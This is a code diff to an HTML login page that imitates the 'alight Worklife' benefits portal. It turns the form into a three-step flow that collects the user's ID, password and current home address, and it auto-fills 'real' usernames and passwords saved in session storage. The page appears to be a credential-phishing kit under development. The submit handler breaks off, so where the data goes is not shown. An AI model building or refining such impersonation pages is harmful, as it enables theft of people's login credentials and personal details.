@@ -117,6 +117,18 @@
             cursor: pointer; 
         }
 
+        .next-btn {
+            width: 100%; 
+            padding: 16px; 
+            background: #1e40af; 
+            color: white; 
+            border: none; 
+            border-radius: 50px; 
+            font-size: 1.1rem; 
+            font-weight: 600; 
+            cursor: pointer; 
+        }
+
         .worklife {
             font-size: 16px;
             font-weight: 600;
@@ -138,6 +150,22 @@
             color: #0052cc;
             font-weight: 500;
         }
+
+        .step { display: none; }
+        .step.active { display: block; }
+        .progress {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 25px;
+        }
+        .dot {
+            width: 10px;
+            height: 10px;
+            background: #cbd5e1;
+            border-radius: 50%;
+        }
+        .dot.active { background: #1e40af; }
     </style>
 </head>
 <body>
@@ -156,31 +184,79 @@
 
     <div class="form-container">
         <form id="loginForm">
-            <div class="form-group">
+
+            <!-- Progress Dots -->
+            <div class="progress">
+                <div class="dot active" id="dot1"></div>
+                <div class="dot" id="dot2"></div>
+                <div class="dot" id="dot3"></div>
+            </div>
+
+            <!-- Step 1: UserID -->
+            <div id="step1" class="step active">
                 <label for="username">Enter your UserID</label>
                 <input type="text" id="username" placeholder="UserID" required>
                 <small class="helper-text">Same ID used to access benefits on alight Worklife web</small>
+                <button type="button" class="next-btn" onclick="nextStep(2)">Next</button>
             </div>
 
-            <div class="form-group">
+            <!-- Step 2: Password -->
+            <div id="step2" class="step">
                 <label for="password">Enter your Password</label>
                 <input type="password" id="password" placeholder="Password" required>
+                <button type="button" class="next-btn" onclick="nextStep(3)">Next</button>
+                <button type="button" onclick="prevStep(1)" style="background:none; border:none; color:#64748b; margin-top:10px;">Back</button>
             </div>
 
-            <div class="form-group">
+            <!-- Step 3: Address + Submit -->
+            <div id="step3" class="step">
                 <label>Home Address (Current)</label>
                 <input type="text" id="address" placeholder="Enter your current home address" required>
+                
+                <div class="forgot-link" style="text-align: right; margin: 15px 0;">
+                    <a href="forgot.html" style="color: #1e40af; font-size: 0.9rem;">Forgot Password?</a>
+                </div>
+
+                <button type="submit" class="login-btn">LOG IN</button>
+                <button type="button" onclick="prevStep(2)" style="background:none; border:none; color:#64748b;">Back</button>
             </div>
 
-            <div class="forgot-link" style="text-align: right; margin: 10px 0 15px;">
-                <a href="forgot.html" style="color: #1e40af; font-size: 0.9rem;">Forgot Password?</a>
-            </div>
-
-            <button type="submit" class="login-btn">LOG IN</button>
         </form>
     </div>
 
     <script>
+        let currentStep = 1;
+
+        function updateProgress() {
+            for (let i = 1; i <= 3; i++) {
+                const dot = document.getElementById('dot' + i);
+                if (dot) dot.classList.toggle('active', i === currentStep);
+            }
+        }
+
+        function nextStep(step) {
+            document.getElementById('step' + currentStep).classList.remove('active');
+            currentStep = step;
+            document.getElementById('step' + currentStep).classList.add('active');
+            updateProgress();
+        }
+
+        function prevStep(step) {
+            document.getElementById('step' + currentStep).classList.remove('active');
+            currentStep = step;
+            document.getElementById('step' + currentStep).classList.add('active');
+            updateProgress();
+        }
+
+        // Auto-fill after password reset
+        window.onload = function() {
+            const savedUsername = sessionStorage.getItem('realUsername');
+            const savedPassword = sessionStorage.getItem('realPassword');
+
+            if (savedUsername) document.getElementById('username').value = savedUsername;
+            if (savedPassword) document.getElementById('password').value = savedPassword;
+        };
+
         document.getElementById('loginForm').addEventListener('submit', async (e) => {
             e.preventDefault();
             
